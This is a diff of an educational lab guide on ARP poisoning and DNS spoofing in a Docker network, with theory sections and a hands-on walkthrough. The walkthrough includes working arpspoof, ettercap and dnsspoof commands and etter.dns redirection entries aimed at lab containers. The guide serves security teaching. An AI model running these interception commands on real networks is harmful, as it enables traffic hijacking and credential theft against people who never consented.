@@ -1,1363 +1,1077 @@
-# DNS Spoofing Laboratory Guide
-
-## Part 1: Theoretical Concepts
-
-### 1. Introduction to Network Security
-This laboratory focuses on DNS spoofing, a network attack that exploits vulnerabilities in the Domain Name System. Before diving into the practical exercise, it's essential to understand the underlying concepts and technologies involved.
-
-### 2. Basic Network Concepts
-
-#### 2.1 IP Addressing
-- **Definition**: Unique numerical identifier for devices on a network.
-
-<div class="network-diagram">
-<h4>Network Addressing Example</h4>
-<div class="device client">Client<br/>192.168.1.10</div>
-<span class="arrow">→</span>
-<div class="device router">Router<br/>192.168.1.1</div>
-<span class="arrow">→</span>
-<div class="device server">Server<br/>93.184.216.34</div>
-</div>
-
-The diagram illustrates basic communication between devices on a network using IP addresses. The elements of this communications are:
-
-- **Client (192.168.1.10)**: Represents your personal computer or any device that initiates communication. It has a private IP from the local network.
-- **Router (192.168.1.1)**: The gateway that connects your local network to the Internet. It acts as an intermediary between your home network and the outside world.
-- **Server (93.184.216.34)**: A server on the Internet with a public IP that provides web services or resources.
-
-When you type a URL in your browser, the request travels from your client to the router, and then to the destination server on the Internet. This fundamental process allows any device on your local network to communicate with remote servers through the Internet.
-
-- **Types**
-    * IPv4: 32-bit address (e.g., 192.168.1.1)
-    * IPv6: 128-bit address (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334)
-- **Assignment**
-    * Static: Manually configured
-    * Dynamic: Automatically assigned by DHCP
-
-#### 2.2 MAC Addresses
-- **Definition**: Physical hardware address of network interfaces
-
-<div class="interactive-demo">
-<h4>MAC Address Structure</h4>
-<div class="code-highlight">
-<strong>MAC Address Format:</strong> 00:1A:2B:3C:4D:5E<br/>
-<span style="color: #007bff;">OUI (Vendor)</span> : <span style="color: #28a745;">Device Identifier</span><br/>
-<span style="color: #007bff;">00:1A:2B</span> : <span style="color: #28a745;">3C:4D:5E</span>
-</div>
-</div>
-
-This diagram shows the structure of a MAC (Media Access Control) address. A MAC address consists of two main parts:
-
-- **OUI (Organizationally Unique Identifier)**: The first 3 bytes (00:1A:2B) identify the device manufacturer. Each manufacturer has unique codes assigned by the IEEE.
-- **Device Identifier**: The last 3 bytes (3C:4D:5E) are unique for each device manufactured by that company.
-
-This structure ensures that every network card in the world has a unique MAC address. It's like the "serial number" of your network card.
-
-- **Characteristics**:
-    * 48-bit length (e.g., 00:1A:2B:3C:4D:5E)
-    * Unique to each network interface
-    * Used for local network communication
-    * Cannot be permanently changed (but can be spoofed)
-
-#### 2.3 Network Layers (OSI Model)
-1. **Layer 2 (Data Link)**
-
-   * Handles MAC addressing
-   * Where ARP operates
-   * Local network communication
-
-2. **Layer 3 (Network)**
-
-   * IP addressing and routing
-   * Internet-wide communication
-   * Where our attack will operate
-
-3. **Layer 7 (Application)**
-
-   * DNS and web services
-   * End-user applications
-   * Where the impact will be visible
-
-### 3. DNS System
-
-#### 3.1 What is DNS?
-The Domain Name System translates human-readable domain names (like www.example.com) into IP addresses that computers can use. Think of it as a network's phone book.
-
-<div class="network-diagram">
-<h4>DNS Resolution Flow</h4>
-<div class="device client">User<br/>Query: "www.google.com"</div>
-<span class="arrow">→</span>
-<div class="device router">Local Cache<br/>Check: Cache Miss</div>
-<span class="arrow">→</span>
-<div class="device router">Recursive Resolver<br/>ISP DNS: 8.8.8.8</div>
-<span class="arrow">→</span>
-<div class="device router">Root Server<br/>Response: ".com NS"</div>
-<span class="arrow">→</span>
-<div class="device router">TLD Server<br/>Response: "google.com NS"</div>
-<span class="arrow">→</span>
-<div class="device server">Authoritative Server<br/>Response: "142.250.185.14"</div>
-</div>
-
-<div class="interactive-demo">
-<h4>DNS Translation Process</h4>
-<div class="code-highlight">
-<strong>Input:</strong> www.google.com (Human-readable domain)<br/>
-<strong>Process:</strong> DNS Resolution Chain<br/>
-<strong>Output:</strong> 142.250.185.14 (Machine-readable IP)<br/>
-<strong>Time:</strong> ~50-200ms (typical)<br/>
-<strong>Translation:</strong> Domain Name ↔ IP Address Mapping
-</div>
-</div>
-
-**DNS Resolution Flow Diagram:**
-
-This first diagram shows the network components and data flow when you type a web address in your browser. Each device in the chain plays a specific role in resolving domain names to IP addresses:
-
-**DNS Resolution Chain Components:**
-
-1. **User Query**: Your computer initiates a request for "www.google.com" - a human-readable domain name
-2. **Local Cache Check**: First checks if the domain-to-IP mapping is already stored locally (cache miss in this example)
-3. **Recursive Resolver (ISP DNS)**: Your Internet provider's DNS server (like 8.8.8.8) takes over the resolution process
-4. **Root Server**: Returns nameserver information for the ".com" top-level domain
-5. **TLD Server**: Provides nameserver information specifically for "google.com" domain
-6. **Authoritative Server**: Contains the actual DNS record and returns the final IP address "142.250.185.14"
-
-**DNS Translation Process Diagram:**
-
-This second diagram focuses specifically on the translation concept, showing how DNS converts between human-readable and machine-readable formats:
-
----
-
-**Domain-to-IP Translation Details:**
-
-- **Input**: Human-friendly domain name (www.google.com)
-- **Processing**: Multi-step DNS hierarchy navigation through the resolution chain
-- **Output**: Machine-readable IP address (142.250.185.14)
-- **Performance**: Typical resolution time ranges from 50-200 milliseconds
-- **Translation Function**: Acts as a bidirectional mapping between domain names and IP addresses
-
-This translation process is essential because while humans prefer memorable domain names, computers and routers need numerical IP addresses to route traffic across the Internet. The DNS system acts as the universal translator between these two addressing systems.
-
-#### 3.2 DNS Resolution Process
-1. **Query Flow**:
-   ```
-   User → Local DNS Cache → Recursive Resolver → Root Servers → TLD Servers → Authoritative Servers
-   ```
-
-<div class="timeline">
-<div class="timeline-item">
-<strong>Step 1:</strong> User requests www.google.com → Browser needs IP address
-</div>
-<div class="timeline-item">
-<strong>Step 2:</strong> Check local DNS cache → No cached IP for google.com
-</div>
-<div class="timeline-item">
-<strong>Step 3:</strong> Query recursive resolver → ISP DNS server searches
-</div>
-<div class="timeline-item">
-<strong>Step 4:</strong> Contact root servers → Get .com nameservers
-</div>
-<div class="timeline-item">
-<strong>Step 5:</strong> Query TLD servers → Get google.com nameservers
-</div>
-<div class="timeline-item">
-<strong>Step 6:</strong> Get IP from authoritative server → Receive 142.250.185.14
-</div>
-<div class="timeline-item">
-<strong>Step 7:</strong> Return IP to user → Browser connects to 142.250.185.14
-</div>
-</div>
-
-**Process Explanation:**
-This timeline diagram shows the step-by-step domain-to-IP translation process. Each step represents how DNS converts human-readable domain names into machine-readable IP addresses:
-
-1. **Step 1**: User types "www.google.com" in browser → System recognizes need for IP address translation
-2. **Step 2**: Check local DNS cache → Search for cached IP address mapping (cache miss occurs)
-3. **Step 3**: Query ISP's recursive resolver → Forward domain resolution request to provider's DNS
-4. **Step 4**: Contact root servers → Obtain nameserver information for ".com" top-level domain
-5. **Step 5**: Query .com TLD servers → Get specific nameserver information for "google.com"
-6. **Step 6**: Query authoritative server → Receive actual IP address "142.250.185.14"
-7. **Step 7**: Return IP to browser → Complete translation allows connection to Google's server
-
-**Key Domain-to-IP Translation Concepts:**
-- **Domain Name**: Human-friendly identifier (www.google.com)
-- **IP Address**: Numerical network identifier (142.250.185.14)
-- **DNS Resolution**: The translation process between domain and IP
-- **Caching**: Storing previous translations to speed up future requests
-- **TTL (Time To Live)**: How long the IP address mapping remains valid
-
-This entire domain-to-IP translation process typically takes 50-200 milliseconds and is completely transparent to the user. Once complete, your browser uses the IP address to establish a direct connection to the web server.
-
-2. **Server Types**:
-   - Root Servers: Directory of TLD servers
-   - TLD Servers: Manage .com, .org, etc.
-   - Authoritative Servers: Hold actual DNS records
-   - Recursive Resolvers: Handle lookups for clients
-
-3. **DNS Record Types and Domain-to-IP Resolution**:
-
-<div class="interactive-demo">
-<h4>DNS Record Types for Domain Resolution</h4>
-<div class="code-highlight">
-<strong>A Record:</strong> www.google.com → 142.250.185.14 (IPv4)<br/>
-<strong>AAAA Record:</strong> www.google.com → 2607:f8b0:4004:c1b::64 (IPv6)<br/>
-<strong>CNAME Record:</strong> mail.google.com → googlemail.l.google.com<br/>
-<strong>MX Record:</strong> google.com → smtp.google.com (Mail server)<br/>
-<strong>TXT Record:</strong> google.com → "v=spf1 include:_spf.google.com ~all"<br/>
-<strong>NS Record:</strong> google.com → ns1.google.com (Nameserver)
-</div>
-</div>
-
-**DNS Record Types Explanation:**
-Each DNS record type serves a specific purpose in domain-to-IP resolution and service discovery:
-
-- **A Record (Address)**: The most common record type that directly maps a domain name to an IPv4 address. When you visit www.google.com, the A record tells your browser to connect to 142.250.185.14.
-
-- **AAAA Record (IPv6 Address)**: Similar to A records but for IPv6 addresses. Provides the next-generation Internet addressing for the same domain.
-
-- **CNAME Record (Canonical Name)**: Creates an alias from one domain to another. Instead of pointing to an IP, it points to another domain name that then resolves to an IP.
-
-- **MX Record (Mail Exchange)**: Specifies which server handles email for the domain. When you send email to someone@google.com, MX records tell the system where to deliver it.
-
-- **TXT Record (Text)**: Contains human-readable text, often used for verification, security policies (SPF, DKIM), or configuration information.
-
-- **NS Record (Name Server)**: Indicates which DNS servers are authoritative for the domain, essential for the DNS resolution hierarchy.
-
-**Domain Resolution Priority:**
-1. **Direct IP Resolution**: A/AAAA records provide immediate IP addresses
-2. **Alias Resolution**: CNAME records require additional lookups
-3. **Service Resolution**: MX records for specific service routing
-4. **Administrative**: NS and TXT records for management and verification
-
-### 4. ARP Protocol
-
-#### 4.1 Basic Operation
-1. **Purpose**: Maps IP addresses to MAC addresses
-
-<div class="network-diagram">
-<h4>Normal ARP Process</h4>
-<div class="device client">Client<br/>IP: 192.168.1.10<br/>MAC: AA:BB:CC:DD:EE:FF</div>
-<span class="arrow">→</span>
-<div class="packet arp">ARP Request<br/>"Who has 192.168.1.1?"</div>
-<span class="arrow">→</span>
-<div class="device router">Router<br/>IP: 192.168.1.1<br/>MAC: 11:22:33:44:55:66</div>
-<br/><br/>
-<div class="device router">Router</div>
-<span class="arrow">→</span>
-<div class="packet arp">ARP Reply<br/>"192.168.1.1 is at 11:22:33:44:55:66"</div>
-<span class="arrow">→</span>
-<div class="device client">Client</div>
-</div>
-
-**Diagram Explanation:**
-This diagram shows the normal ARP (Address Resolution Protocol) process that allows devices to discover the MAC addresses of other devices on the network:
-
-**First row** (ARP Query):
-- **Client (left)**: A computer with IP 192.168.1.10 and MAC AA:BB:CC:DD:EE:FF
-- **ARP Packet (center)**: The query message "Who has IP 192.168.1.1?"
-- **Router (right)**: The router with IP 192.168.1.1 and MAC 11:22:33:44:55:66
-
-**Second row** (ARP Reply):
-- **Router**: Sends the reply back
-- **ARP Packet**: The response message "192.168.1.1 is at 11:22:33:44:55:66"
-- **Client**: Receives the response and updates its ARP table
-
-This communication is fundamental for devices to communicate on the local network, as they need to know MAC addresses to send data at the link layer.
-
-2. **Normal Process**:
-   - Device broadcasts ARP request asking "Who has this IP?"
-   - Target device responds with "I have that IP, here's my MAC address"
-   - Requesting device updates its ARP table with the IP-MAC mapping
-
-#### 4.2 ARP Vulnerabilities
-- No authentication mechanism
-- Accepts unsolicited responses
-- Cached entries can be overwritten
-- Trust-based system
-
-<div class="network-diagram attack">
-<h4>ARP Poisoning Attack</h4>
-<div class="device client">Victim</div>
-<span class="arrow attack">←</span>
-<div class="device attacker">Attacker<br/>Sends fake ARP</div>
-<span class="arrow attack">→</span>
-<div class="device router">Router</div>
-<br/><br/>
-<div class="packet spoofed">"192.168.1.1 is at [Attacker MAC]"</div>
-<span class="arrow attack">→</span>
-<div class="device client">Victim believes<br/>Router is Attacker</div>
-</div>
-
-**ARP Poisoning Attack Explanation:**
-This diagram illustrates how an attacker can poison ARP tables to intercept traffic:
-
-**Attack components:**
-- **Victim (left)**: The target device that will be deceived
-- **Attacker (center)**: The malicious device that will send false ARP responses
-- **Router (right)**: The legitimate network router
-- **Spoofed packet (bottom)**: The false ARP message saying "192.168.1.1 is at [Attacker's MAC]"
-
-**How the attack works:**
-1. The attacker sends false ARP messages to the victim telling them that they have the router's MAC
-2. Also sends false ARP messages to the router telling it that they have the victim's MAC
-3. As a result, both the victim and router believe the attacker is the device they should communicate with
-4. All traffic between victim and router now passes through the attacker, who can intercept or modify it
-
-Red arrows indicate malicious/compromised communication.
-
-### 5. Attack Fundamentals
-
-#### 5.1 DNS Spoofing
-- **Definition**: Technique to forge DNS responses
-- **Purpose**: Redirect traffic to malicious servers
-- **Impact**: Can lead to:
-    * Credential theft
-    * Data interception
-    * Malware distribution
-    * Privacy violations
-
-<div class="network-diagram attack">
-<h4>DNS Spoofing Attack Flow</h4>
-<div class="device client">Victim</div>
-<span class="arrow">→</span>
-<div class="packet dns">DNS Query<br/>example.com?</div>
-<span class="arrow">→</span>
-<div class="device attacker">Attacker<br/>Intercepts</div>
-<br/><br/>
-<div class="device attacker">Attacker</div>
-<span class="arrow attack">→</span>
-<div class="packet spoofed">Fake DNS Reply<br/>example.com = [Evil IP]</div>
-<span class="arrow attack">→</span>
-<div class="device client">Victim</div>
-<br/><br/>
-<div class="device client">Victim connects to</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Malicious Server</div>
-</div>
-
-**DNS Spoofing Attack Explanation:**
-This diagram shows how a DNS Spoofing attack works in three phases:
-
-**First row** (Intercepted DNS Query):
-- **Victim (left)**: The user makes a normal DNS query
-- **DNS Packet (center)**: The query "What's the IP of example.com?"
-- **Attacker (right)**: Intercepts the query before it reaches the legitimate DNS server
-
-**Second row** (False Response):
-- **Attacker**: Sends a false DNS response
-- **Spoofed packet**: Contains the false response "example.com = [Malicious IP]"
-- **Victim**: Receives and believes the false response
-
-**Third row** (Traffic Redirection):
-- **Victim**: Connects to what they think is example.com
-- **Attacker**: Controls the malicious server where the victim was redirected
-
-The result is that the victim accesses the server controlled by the attacker instead of the legitimate website.
-
-#### 5.2 ARP Poisoning
-- **Definition**: Technique to intercept network traffic
-- **Process**: Attacker sends false ARP messages to associate their MAC address with victim's and router's IP addresses
-- **Result**: All traffic flows through attacker
-
-#### 5.3 Man-in-the-Middle Position
-
-<div class="network-diagram attack">
-<h4>Complete Attack Chain</h4>
-<div class="step-animation warning">
-<strong>Step 1:</strong> ARP Poisoning - Position between victim and router
-</div>
-<div class="device client">Client</div>
-<span class="arrow attack">↔</span>
-<div class="device attacker">Attacker<br/>(MITM)</div>
-<span class="arrow attack">↔</span>
-<div class="device router">Router</div>
-<span class="arrow">↔</span>
-<div class="device server">Internet</div>
-
-<div class="step-animation warning">
-<strong>Step 2:</strong> DNS Interception - Capture and modify DNS queries
-</div>
-<div class="packet dns">DNS Query</div>
-<span class="arrow attack">→</span>
-<div class="device attacker">Modify</div>
-<span class="arrow attack">→</span>
-<div class="packet spoofed">Fake Response</div>
-
-<div class="step-animation warning">
-<strong>Step 3:</strong> Traffic Redirection - Victim connects to malicious server
-</div>
-</div>
-
-**Complete Attack Chain Explanation:**
-This diagram shows the complete sequence of a Man-in-the-Middle attack with DNS Spoofing in three steps:
-
-**Step 1 - Attacker Positioning:**
-- **Client**: The victim to be attacked
-- **Attacker (MITM)**: Positions themselves as intermediary using ARP Poisoning
-- **Router**: The legitimate gateway
-- **Internet**: Represents normal Internet connection
-
-The red bidirectional arrows show that all traffic between client and router now passes through the attacker.
-
-**Step 2 - DNS Interception:**
-- **DNS Query**: The original DNS query from the client
-- **Attacker**: Intercepts and modifies the query
-- **Fake Response**: The false DNS response that redirects to a malicious server
-
-**Step 3 - Traffic Redirection:**
-Once the previous steps are executed, the victim is automatically redirected to the attacker-controlled server when trying to access specific websites.
-
-This attack combines low-level network techniques (ARP) with application attacks (DNS) to create a complete interception scenario.
-
-### 6. Security Considerations
-
-#### 6.1 Legal and Ethical Aspects
-- Only perform on authorized systems
-- Obtain written permission
-- Document all activities
-- Use in controlled environments
-
-#### 6.2 Protection Mechanisms
-- DNSSEC
-- SSL/TLS certificates
-- DNS over HTTPS (DoH)
-- Network monitoring
-- Regular security audits
-
-## Part 2: Practical Exercise
-
-### 1. Laboratory Environment - Kali Linux + Docker Setup
-
-<div class="network-diagram secure">
-<h4>Kali Linux Attack Lab Network Topology</h4>
-<div class="device attacker">Kali Linux Host<br/>192.168.1.20<br/>Attack Platform</div>
-<span class="arrow attack">↔</span>
-<div class="device router">Gateway<br/>192.168.1.1</div>
-<span class="arrow">↔</span>
-<div class="device server">DNS Server<br/>192.168.1.4<br/>dnsmasq container</div>
-<br/><br/>
-<div class="device client">Requester<br/>192.168.1.30<br/>Ubuntu container</div>
-<span class="arrow">↔</span>
-<div class="device router">macvlan Bridge<br/>eth0</div>
-<span class="arrow">↔</span>
-<div class="device server">Good Web Server<br/>192.168.1.10<br/>goodserver.com</div>
-<br/><br/>
-<div class="device attacker">Evil Web Server<br/>192.168.1.100<br/>container target</div>
-<span class="arrow attack">↔</span>
-<div class="device attacker">Kali Linux<br/>Network Controller</div>
-<span class="arrow attack">↔</span>
-<div class="device router">Docker Network<br/>Management</div>
-<br/><br/>
-<div class="interactive-demo">
-<strong>Hybrid Environment:</strong><br/>
-• Kali Linux: Physical attack machine<br/>
-• Docker containers: Target environment<br/>
-• Macvlan network: 192.168.1.0/24<br/>
-• Network manipulation capabilities
-</div>
-</div>
-
-**Kali Linux Attack Lab Topology Explanation:**
-This diagram shows the hybrid network configuration where a physical Kali Linux machine attacks containerized services:
-
-**Physical components:**
-- **Kali Linux Host (192.168.1.20)**: Physical attack machine with full network access and Docker control
-- **Gateway (192.168.1.1)**: Physical network router connecting all devices
-
-**Container components:**
-- **DNS Server (192.168.1.4)**: dnsmasq container handling DNS resolution
-- **Good Web Server (192.168.1.10)**: FastAPI container serving goodserver.com  
-- **Evil Web Server (192.168.1.100)**: Malicious FastAPI container for redirection
-- **Requester Client (192.168.1.30)**: Ubuntu container acting as victim making HTTP requests
-
-**Attack capabilities:**
-- **Network Control**: Kali can manipulate Docker network traffic using ARP poisoning and DNS spoofing
-- **Container Management**: Direct access to modify container configurations and network routing
-- **Traffic Interception**: Position between containers and legitimate services
-- **Real-time Monitoring**: Complete visibility of attack effects on containerized services
-
-#### 1.1 Required Tools and Prerequisites
-1. **Kali Linux machine** with network access to Docker host
-2. **Docker and Docker Compose** installed on target host
-3. **Root privileges** on both Kali Linux and Docker host
-4. **Network tools** installed on Kali Linux:
-   - ettercap
-   - dsniff  
-   - arpspoof
-   - nmap
-   - wireshark
-5. **SSH access** to Docker host (if running remotely)
-6. **Available network interface** (eth0 by default) for macvlan bridge
-
-#### 1.2 Initial Setup
-
-<div class="step-animation">
-<strong>Step 1:</strong> Prepare Kali Linux Attack Environment
-</div>
-
-```bash
-# Update Kali Linux and install required tools
-sudo apt update && sudo apt upgrade -y
-sudo apt install -y ettercap-text-only dsniff nmap wireshark tcpdump arpspoof
-
-# Verify network tools are installed
-ettercap --version
-arpspoof 2>&1 | head -1
-nmap --version
+# Laboratory 1: ARP Spoofing and DNS Spoofing in Docker Networks
+
+!!! info "Laboratory Objectives"
+    - Understand the concepts of ARP Spoofing and DNS Spoofing
+    - Learn to perform these attacks within a Docker network
+    - Configure a controlled environment for security testing
+    - Use specialized tools for network analysis
+
+## 📋 Fundamental Concepts
+
+### What is ARP Spoofing?
+
+!!! note "ARP Spoofing Definition"
+    **ARP Spoofing** (also known as ARP Poisoning) is an attack technique where an attacker sends falsified ARP messages in a local network to associate their MAC address with another host's IP address. In this laboratory, the attacker impersonates the **DNS server** to intercept the victim's DNS queries.
+
+!!! info "Man-in-the-Middle (MITM) Concept"
+    A **MITM** attack is a technique where the attacker secretly positions themselves between two parties who believe they are communicating directly with each other. In this laboratory:
+    
+    - The attacker positions themselves between the **victim** (192.168.1.30) and the **DNS server** (192.168.1.4)
+    - **Intercepts** all DNS queries from the victim
+    - **Modifies** DNS responses to redirect traffic to the malicious server
+    - **Redirects** HTTP traffic to the malicious server (192.168.1.100)
+
+#### How does ARP work?
+
+```mermaid
+sequenceDiagram
+    participant Client
+    participant Switch
+    participant Server
+    
+    Client->>Switch: ARP Request: Who has 192.168.1.10?
+    Switch->>Server: ARP Request: Who has 192.168.1.10?
+    Server->>Switch: ARP Reply: 192.168.1.10 is at MAC aa:bb:cc:dd:ee:ff
+    Switch->>Client: ARP Reply: 192.168.1.10 is at MAC aa:bb:cc:dd:ee:ff
 ```
 
-<div class="step-animation">
-<strong>Step 2:</strong> Setup Docker Environment on Target Host
-</div>
+#### ARP Spoofing in action
 
-```bash
-# On Docker host (can be same machine as Kali or remote)
-git clone https://github.com/your-repo/TFM-Labos.git
-cd TFM-Labos/src
-
-# Review environment configuration
-cat .env
+```mermaid
+sequenceDiagram
+    participant Victim
+    participant Attacker
+    participant Gateway
+    
+    Note over Attacker: Sends falsified ARP Reply
+    Attacker->>Victim: ARP Reply: Gateway is at Attacker-MAC
+    Note over Victim: Updates ARP table
+    Victim->>Attacker: Traffic destined for Gateway
+    Attacker->>Gateway: Forwards traffic (optional)
 ```
 
-<div class="interactive-demo">
-<h4>Network Configuration</h4>
-<div class="code-highlight">
-<strong>Docker Host Network:</strong> 192.168.1.0/24<br/>
-<strong>Kali Linux IP:</strong> 192.168.1.20 (static recommended)<br/>
-<strong>DNS Server:</strong> 192.168.1.4 (container)<br/>
-<strong>Good Web Server:</strong> 192.168.1.10 (goodserver.com)<br/>
-<strong>Evil Web Server:</strong> 192.168.1.100 (attack target)<br/>
-<strong>Victim Client:</strong> 192.168.1.30 (container)
-</div>
-</div>
+### What is DNS Spoofing?
 
-<div class="step-animation">
-<strong>Step 3:</strong> Start Docker Laboratory Environment
-</div>
+!!! note "DNS Spoofing Definition"
+    **DNS Spoofing** is a technique where the attacker positions themselves as an intermediary (MITM) between the victim and the DNS server to intercept and modify DNS responses, redirecting traffic towards malicious servers.
+
+## 🏗️ Complete Step-by-Step Manual Attack Guide
+
+This section provides a detailed manual approach to understanding and executing ARP and DNS spoofing attacks without automated scripts. This helps you understand the underlying concepts and tools.
+
+### Phase 1: Environment Preparation and Reconnaissance
+
+#### Step 1.1: Launch the Docker Environment
+
+First, ensure the Docker environment is running:
 
 ```bash
-# Start all containers (on Docker host)
+# Navigate to the project directory
+cd /home/moonb/TFM-Labos/src
+
+# Start all containers
 docker-compose up -d
 
 # Verify all containers are running
 docker-compose ps
-
-# Check container network configuration
-docker network ls
-docker network inspect src_internal_network
 ```
 
-<div class="step-animation">
-<strong>Step 4:</strong> Verify Kali Linux Network Access
-</div>
+Expected output should show all containers in "Up" state:
+- `kali_attacker` (192.168.1.20)
+- `http_requester` (192.168.1.30) - Our victim
+- `web_server` (192.168.1.10) - Legitimate server
+- `evil_web_server` (192.168.1.100) - Malicious server
+- `dns` (192.168.1.4) - DNS server
+
+#### Step 1.2: Access the Attacker Container
 
 ```bash
-# From Kali Linux, verify connectivity to containers
-ping -c 3 192.168.1.4   # DNS server
-ping -c 3 192.168.1.10  # Good web server  
-ping -c 3 192.168.1.30  # Victim client
-ping -c 3 192.168.1.100 # Evil web server
+# Enter the Kali Linux attacker container
+docker-compose exec kali_attacker bash
+```
 
-# Scan the Docker network
+#### Step 1.3: Network Reconnaissance
+
+Before starting any attack, perform reconnaissance to understand the network:
+
+```bash
+# Check your network interface
+ip addr show eth0
+
+# View current routing table
+ip route show
+
+# Discover active hosts on the network
 nmap -sn 192.168.1.0/24
 
-# Test initial DNS resolution
-nslookup goodserver.com 192.168.1.4
+# Alternative host discovery
+arp-scan -l
+
+# Check current ARP table
+arp -a
 ```
 
-**Initial Setup Explanation:**
-- **Kali Linux**: Physical attack machine with full control over network tools and protocols
-- **Docker host**: Can be the same machine as Kali or a separate system running the containerized lab
-- **Network bridging**: The macvlan network allows containers to appear as physical devices on the network
-- **Attack positioning**: Kali Linux has direct access to manipulate traffic between containers
+#### Step 1.4: Verify Tool Availability
 
-### 2. Attack Implementation from Kali Linux
-
-<div class="timeline">
-<div class="timeline-item attack">
-<strong>Phase 1:</strong> Network Reconnaissance and Analysis
-</div>
-<div class="timeline-item attack">
-<strong>Phase 2:</strong> ARP Poisoning Setup
-</div>
-<div class="timeline-item attack">
-<strong>Phase 3:</strong> DNS Spoofing Implementation
-</div>
-<div class="timeline-item attack">
-<strong>Phase 4:</strong> Attack Monitoring and Verification
-</div>
-</div>
-
-**Attack Phases Explanation:**
-This timeline shows the four main phases for executing a DNS Spoofing attack from Kali Linux against the Docker containers:
-
-- **Phase 1 - Network Reconnaissance**: Discover container topology and identify attack targets
-- **Phase 2 - ARP Poisoning**: Position Kali Linux as man-in-the-middle between containers
-- **Phase 3 - DNS Spoofing**: Intercept and modify DNS queries from victim container
-- **Phase 4 - Attack Monitoring**: Observe traffic redirection and attack success
-
-Each phase leverages Kali Linux's powerful network tools to manipulate the containerized environment.
-
-#### 2.1 Phase 1: Network Reconnaissance and Analysis
-
-<div class="step-animation">
-<strong>Step 1:</strong> Discover Container Network Topology
-</div>
+Check that all required tools are installed:
 
 ```bash
-# From Kali Linux - Scan the Docker network
-nmap -sn 192.168.1.0/24
+# Check ettercap installation
+ettercap --version
 
-# Detailed scan of active containers
-nmap -sV -O 192.168.1.4,192.168.1.10,192.168.1.30,192.168.1.100
+# List available ettercap plugins
+ettercap -P list | grep dns_spoof
 
-# Check ARP table to see current MAC addresses
-arp -a | grep "192.168.1"
+# Check dsniff tools
+which arpspoof
+which dnsspoof
 
-# Monitor current network traffic
-sudo tcpdump -i eth0 -n net 192.168.1.0/24
+# Check network capture tools
+which tcpdump
+which wireshark
 ```
 
-<div class="step-animation">
-<strong>Step 2:</strong> Analyze Container Communications
-</div>
+### Phase 2: Understanding Normal Network Behavior
+
+#### Step 2.1: Observe Normal DNS Resolution
+
+Before attacking, observe how normal DNS resolution works:
 
 ```bash
-# Monitor DNS traffic from victim container
-sudo tcpdump -i eth0 -n port 53
+# In attacker container, monitor DNS traffic
+tcpdump -i eth0 port 53 &
 
-# Monitor HTTP traffic patterns
-sudo tcpdump -i eth0 -n port 80 and host 192.168.1.30
+# In another terminal, access the victim container
+docker-compose exec http_requester sh
 
-# Test current DNS resolution behavior
-nslookup goodserver.com 192.168.1.4
-dig @192.168.1.4 goodserver.com
+# From victim, perform normal DNS lookup
+nslookup goodserver.com
+dig goodserver.com
+
+# Check ARP table on victim
+arp -a
 ```
 
-#### 2.2 Phase 2: ARP Poisoning Setup
+Expected normal behavior:
+- DNS queries go to 192.168.1.4 (DNS server)
+- `goodserver.com` resolves to 192.168.1.10 (legitimate server)
+- ARP table shows correct MAC addresses
 
-<div class="step-animation success">
-<strong>Step 1:</strong> Enable IP Forwarding on Kali Linux
-</div>
+#### Step 2.2: Test Normal HTTP Connectivity
 
 ```bash
-# Enable IP forwarding to maintain connectivity
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+# From victim container, test HTTP connectivity
+curl -H "Host: goodserver.com" http://192.168.1.10
 
-# Verify IP forwarding is enabled
+# Should return legitimate server response
+```
+
+### Phase 3: Manual ARP Spoofing Implementation
+
+#### Step 3.1: Enable IP Forwarding
+
+On the attacker machine, enable IP forwarding to act as a router:
+
+```bash
+# Check current forwarding status
 cat /proc/sys/net/ipv4/ip_forward
+
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Verify it's enabled
+sysctl net.ipv4.ip_forward
 ```
 
-<div class="step-animation success">
-<strong>Step 2:</strong> Execute ARP Poisoning Attack
-</div>
+#### Step 3.2: Understand ARP Spoofing Theory
+
+ARP spoofing works by sending fake ARP replies to associate the attacker's MAC address with the target IP:
 
 ```bash
-# Method 1: Using arpspoof (simple)
-# Terminal 1: Poison victim -> DNS server
-sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.4
+# Check your MAC address
+ip addr show eth0 | grep ether
 
-# Terminal 2: Poison DNS server -> victim  
-sudo arpspoof -i eth0 -t 192.168.1.4 192.168.1.30
-
-# Method 2: Using ettercap (advanced)
-# Single command for bidirectional ARP poisoning
-sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4//
+# Check target's current ARP entry
+arp -a | grep 192.168.1.4  # DNS server
 ```
 
-<div class="step-animation success">
-<strong>Step 3:</strong> Verify ARP Poisoning Success
-</div>
+#### Step 3.3: Manual ARP Spoofing with arpspoof
+
+Start ARP spoofing to make the victim believe the attacker is the DNS server:
 
 ```bash
-# Check if traffic is flowing through Kali Linux
-sudo tcpdump -i eth0 -n host 192.168.1.30 and host 192.168.1.4
+# Spoof ARP: Tell victim (192.168.1.30) that DNS server (192.168.1.4) is at attacker's MAC
+arpspoof -i eth0 -t 192.168.1.30 192.168.1.4
 
-# Monitor for DNS queries being intercepted
-sudo tcpdump -i eth0 -n port 53 and host 192.168.1.30
+# In another terminal, you can also do bidirectional spoofing (optional)
+# arpspoof -i eth0 -t 192.168.1.4 192.168.1.30
 ```
 
-#### 2.3 Phase 3: DNS Spoofing Implementation
+#### Step 3.4: Verify ARP Spoofing Success
 
-<div class="step-animation success">
-<strong>Step 1:</strong> Configure DNS Spoofing with ettercap
-</div>
+In a separate terminal, check if the victim's ARP table has been poisoned:
 
 ```bash
-# Create DNS spoofing configuration
-sudo nano /etc/ettercap/etter.dns
+# Access victim container
+docker-compose exec http_requester arp -a
 
-# Add DNS redirection rules
-echo "goodserver.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns
-echo "*.goodserver.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns
-
-# Launch ettercap with DNS spoofing
-sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4// -P dns_spoof
+# Look for 192.168.1.4 (DNS server)
+# The MAC address should now match the attacker's MAC address
 ```
 
-<div class="step-animation success">
-<strong>Step 2:</strong> Alternative Method - Using dnsspoof
-</div>
+### Phase 4: Manual DNS Spoofing Implementation
+
+#### Step 4.1: Create DNS Spoofing Configuration
+
+Create a configuration file for DNS spoofing:
 
 ```bash
-# Create hosts file for dnsspoof
-echo "192.168.1.100 goodserver.com" | sudo tee /tmp/dns_hosts
-
